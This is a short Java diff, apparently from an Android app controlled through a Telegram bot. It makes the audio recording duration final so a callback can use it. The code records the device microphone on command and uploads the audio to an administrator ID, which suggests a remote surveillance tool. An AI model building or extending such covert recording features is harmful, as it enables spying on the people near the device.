@@ -117,11 +117,13 @@ public class TelegramBotWorker implements Runnable {
                             duration = 30;
                         }
                     }
-                    sendMessage("Recording " + duration + " seconds of audio...", context);
-                    AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() {
+
+                    final int finalDuration = duration;
+                    sendMessage("Recording " + finalDuration + " seconds of audio...", context);
+                    AudioHandler.startRecording(context, finalDuration, new AudioHandler.AudioCallback() {
                         @Override
                         public void onRecordingFinished(String filePath) {
-                            uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio Recording", context);
+                            uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio Recording", context);
                         }
                         @Override
                         public void onError(String error) {
